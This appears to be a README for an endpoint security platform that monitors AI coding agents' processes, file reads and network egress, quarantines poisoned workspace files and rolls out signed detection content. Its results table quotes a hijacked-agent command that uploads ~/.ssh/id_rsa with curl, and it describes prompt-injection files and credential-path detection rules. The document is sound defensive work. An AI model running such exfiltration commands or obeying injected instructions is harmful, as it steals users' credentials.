# Endpoint fleet platform: checkpointd agent, control plane, persistent AI Risk DB, portal

The gateway protects AI traffic that is routed through it. The fleet platform adds the **kernel-checkpoint direction** from [architecture.md §19](../architecture.md): an agent on every endpoint that sees what AI agents actually *do* (files they read, commands they run, connections they open), driven by a persistent, signed AI Risk DB.

```
 Endpoint (checkpointd)                         Control plane (same FastAPI app, /v1/cp)        Portal (/portal)
 ─────────────────────                          ────────────────────────────────────────        ──────────────
 sensors ─► local engine ─► enforce             persistent AI Risk DB (SQLite → Postgres)       Overview
   process/exec (50 ms poll; eBPF LSM on Linux)   61 seed entries + learned + analyst            Detections + lineage
   files (workspace pre-scan)                   content pipeline:                               Endpoints (ring, mode)
   network egress                                 snapshot → gate → Ed25519 sign → ring rollout AI Risk DB (OWASP/ATLAS)
 signed content bundle ◄──── heartbeat ───────    CANARY → EARLY → BROAD → GA, auto-rollback    Content releases
 telemetry (offline outbox) ───────────────────► events, health, hit counts                     Deploy · Audit log
                                                learning loop: gateway quarantine → LEARNED entries → auto-release to CANARY
```

## Run it

```bash
./scripts/start_fleet_demo.sh          # gateway + portal on :8080, two agents (CANARY + BROAD), attack, learning loop
open http://localhost:8080/portal
pkill -f agent.checkpointd; pkill -f "uvicorn src.main:app"    # stop
```

To run an agent by hand:

```bash
python -m agent.checkpointd --server http://127.0.0.1:8080 --enroll-token enroll-demo-default \
  --watch ~/work --watch ~/Downloads --ring CANARY
```

By default `claude`, `gemini`, `cursor`, `aider`, `codex`, `copilot`, `ollama` and similar processes count as AI agents (`--ai-process` replaces the list). Running it in ENFORCE mode on your own machine **will kill** commands those tools run that touch `~/.ssh`, `~/.aws` and other credential paths.

## What each part does

| Part | Code | Behaviour |
|---|---|---|
| **Exec checkpoint** | `agent/checkpointd/sensors/process.py`, `engine.py` | Rebuilds the lineage of every new process; only AI-agent descendants are judged. Credential path + network tool → CRITICAL `TOOL_HIJACK`; credential read → `SECRET_ACCESS`; destructive commands; everything else goes through the full AI-EDR pipeline as a tool call. ENFORCE kills the process tree. Re-judges a young process when its command line changes (fork/exec race) |
| **File checkpoint** | `sensors/files.py`, `daemon.py` | Pre-scans documents in watched workspaces with the full pipeline (hidden layers, Tier 1–3, IOAs). Poisoned file → original moved to a 0400 quarantine, `<name>.sanitized.txt` written in its place. Clean files are untouched |
| **Egress checkpoint** | `sensors/process.py` | AI-lineage connections to anything outside the allow-list (LLM APIs, GitHub, package registries, private ranges) → alert, or kill with `--block-egress` |
| **Kernel checkpoint (Linux)** | `agent/kernel/linux/`, `sensors/linux_ebpf.py` | BPF LSM program: lineage inherited on fork in-kernel; `file_open` on protected inodes and `socket_connect` to non-allow-listed IPv4 → `-EPERM` inside the syscall; every AI-lineage exec reported to user space. The kernel only enforces maps; it never parses content |
| **Content safety** | `src/control_plane/content.py`, `agent/checkpointd/engine.py` | Bundles are Ed25519-signed per tenant; the agent pins the key at enrollment, verifies signature and SHA-256 and keeps the last good content on any failure |
| **Quality gate** | `config/gate_corpus.json` | Every release replays 35 attacks (EN + KO) and 40 benign texts (prose, code, Korean). Fails on any false positive, recall < 85 % or a recall drop > 5 points |
| **Rollout** | `src/control_plane/store.py` | Rings CANARY → EARLY → BROAD → GA; an endpoint gets the newest release promoted to its ring or later. ≥ 2 agents reporting `CONTENT_LOAD_FAILED` / `SAFE_MODE` for a version → automatic rollback |
| **Agent safety** | `daemon.py`, `state.py` | Boot-loop guard (safe mode = monitor only after 2 unclean exits), fail-open on detector errors, atomic state writes, offline outbox with idempotent event IDs |
| **Learning loop** | `src/control_plane/api.py` | Gateway promotions become TENANT-tier `LEARNED` entries; a confident re-observation confirms pending ones; auto-release builds, gates and promotes to CANARY only |
| **Taxonomy** | `src/control_plane/taxonomy.py` | Every entry and category maps to OWASP Top 10 for LLM Apps (2025) and a MITRE ATLAS technique |

## Results (31 Oct 2026, MacBook, user-space sensors)

| Check | Result |
|---|---|
| Hijacked agent runs `sh -c "…; curl -F key=@~/.ssh/id_rsa https://…"` | **Killed** before the curl step (exit −9); lineage `demo_ai_agent → sh` shown in the portal |
| Normal agent commands (`git --version`, `python3 -c …`) | Allowed, no alert |
| Poisoned resume PDF and README in the workspace | **Sanitized** (originals quarantined); clean `notes.md` untouched |
| Gateway zero-day (Korean, hidden in a FAQ) | Learned → release v2 built, gated (88.6 % recall, 0 / 40 FP), signed, on the CANARY endpoint within ~5 s; BROAD stayed on v1 until promoted |
| Tampered bundle (entry removed; or hash recomputed) | Rejected (`ValueError` / `InvalidSignature`), previous content kept |
| Entry that fires on benign text (`"ignore the typo"`) | Release **GATE_FAILED**; promotion refused (409) |
| Two canaries report content failure | Release auto-rolled back; canaries return to v1 |
| Tests | 23 new tests (`tests/test_control_plane.py`, `tests/test_agent.py`); full suite 81 passed, 2 xfailed |

![Portal overview](screens/portal_overview.png)
![Detection with process lineage](screens/portal_detections.png)
![Content releases](screens/portal_releases.png)

## Honest limits

- **The user-space sensor reacts; it does not pre-empt.** It polls every 50 ms and kills; a command that finishes faster can complete (reported as `EXITED_BEFORE_KILL`). Pre-exec denial needs the kernel checkpoint: the Linux BPF LSM program here, macOS Endpoint Security (`AUTH_EXEC`/`AUTH_OPEN`, needs an Apple entitlement) or a Windows minifilter + WFP (needs driver signing).
- **The BPF code is not compiled or run yet.** No Linux host was available for this build; it targets kernels ≥ 5.7 with `CONFIG_BPF_LSM` and `lsm=…,bpf`, and needs a test pass on a real kernel.
- **File pre-scan is a workspace sweep,** not a kernel read hook: files outside watched folders are not scanned, and a file read before the sweep reaches it is not stopped.
- **Signing key** lives on disk (`data/keys/`, 0600); production uses an HSM / cloud KMS, and the installer pins the public key instead of trust-on-first-enrollment.
- **SQLite** stands in for Postgres; one control plane node; no RBAC/SSO on the portal yet (optional `AI_EDR_API_KEY` only).
- **No tamper protection** for the agent process itself yet (protected service / system extension).
